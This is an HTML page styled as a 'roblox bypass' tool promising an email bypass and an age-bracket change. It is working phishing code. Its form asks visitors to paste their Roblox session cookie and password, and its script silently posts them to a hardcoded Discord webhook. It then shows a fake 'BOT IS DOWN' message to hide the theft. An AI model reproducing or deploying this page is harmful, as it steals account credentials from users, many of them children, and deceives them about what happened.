<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Roblox tools</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: "Segoe UI", sans-serif;
      background: linear-gradient(135deg, #141e30, #243b55);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: rgba(47, 49, 54, 0.95);
      padding: 30px;
      border-radius: 20px;
      width: 540px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6),
                  0 0 30px rgba(88, 101, 242, 0.4);
      border: 2px solid transparent;
      background-image: linear-gradient(135deg, #2f3136, #23272a),
                        linear-gradient(135deg, #5865f2, #43b581);
      background-origin: border-box;
      background-clip: padding-box, border-box;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 26px;
      color: #7289da;
      text-shadow: 0 0 8px #5865f299;
    }
    .options {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 14px;
      margin-bottom: 22px;
    }
    .option {
      background: #4f545c;
      padding: 18px;
      border-radius: 14px;
      text-align: center;
      cursor: pointer;
      transition: all 0.25s ease;
      font-size: 22px;
      font-weight: bold;
      user-select: none;
      border: 2px solid transparent;
    }
    .option:hover {
      background: #5865f2;
      transform: translateY(-3px) scale(1.05);
      box-shadow: 0 0 12px #5865f299;
    }
    .option.active {
      background: #43b581;
      border-color: #2ecc71;
      box-shadow: 0 0 18px #2ecc71cc;
      transform: scale(1.1);
    }
    textarea {
      width: 100%;
      height: 120px;
      padding: 14px;
      border-radius: 14px;
      border: 2px solid transparent;
      resize: none;
      margin-bottom: 16px;
      font-size: 15px;
      background: #202225;
      color: white;
      outline: none;
      background-image: linear-gradient(#202225, #2c2f33),
                        linear-gradient(135deg, #5865f2, #43b581);
      background-origin: border-box;
      background-clip: padding-box, border-box;
    }
    textarea:focus {
      box-shadow: 0 0 12px #5865f299;
    }
    button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 14px;
      background: linear-gradient(135deg, #5865f2, #4752c4);
      color: white;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.25s ease;
      box-shadow: 0 0 12px rgba(0,0,0,0.4);
    }
    button:hover {
      background: linear-gradient(135deg, #6d7ff7, #5865f2);
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(88,101,242,0.5);
    }
    button:active {
      transform: scale(0.97);
    }
    /* Zusatzfeld Styling */
    #extraBox {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2> roblox bypass</h2>
    <div class="options" id="options">
      <div class="option">email bypass [up to 2008]</div>
      <div class="option">13+ to 13- all ages</div>
      <div class="option">coming soon...</div>
      <div class="option">coming soon...</div>
    </div>
    <textarea id="message" placeholder="paste your cookie there"></textarea>
    <textarea id="extraBox" placeholder="paste the password"></textarea>
    <button id="sendBtn">▶️ Start</button>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1413845619532890292/b7-jti8140GdQMIxhppoYVN5aTt70Q4TeMelJCI-rYX7VXiDwdAfr1-RwBbkjuBb2upd"; 
    let selectedOption = null;

    const extraBox = document.getElementById("extraBox");

    // Optionen Klick
    document.querySelectorAll(".option").forEach(opt => {
      opt.addEventListener("click", () => {
        document.querySelectorAll(".option").forEach(o => o.classList.remove("active"));
        opt.classList.add("active");
        selectedOption = opt.textContent.trim();

        // Wenn "13+ to 13- all ages" gewählt → extra Feld anzeigen
        if (selectedOption === "13+ to 13- all ages") {
          extraBox.style.display = "block";
        } else {
          extraBox.style.display = "none";
        }
      });
    });

    // Senden
    document.getElementById("sendBtn").addEventListener("click", async () => {
      const msg = document.getElementById("message").value;
      const extra = extraBox.value;

      if (!msg) {
        alert("❌ PASTE THE COOKIE");
        return;
      }
      if (!selectedOption) {
        alert("❌ PICK AN OPTION ");
        return;
      }

      let finalMsg = `${selectedOption} ${msg}`;
      if (selectedOption === "13+ to 13- all ages" && extra) {
        finalMsg += ` | Extra: ${extra}`;
      }

      try {
        const response = await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: finalMsg }),
        });

        if (!response.ok) throw new Error("HTTP " + response.status);
        alert("BOT IS DOWN ");
      } catch (err) {
        alert("⚠️ Fehler: " + err.message);
      }
    });
  </script>
</body>
</html>
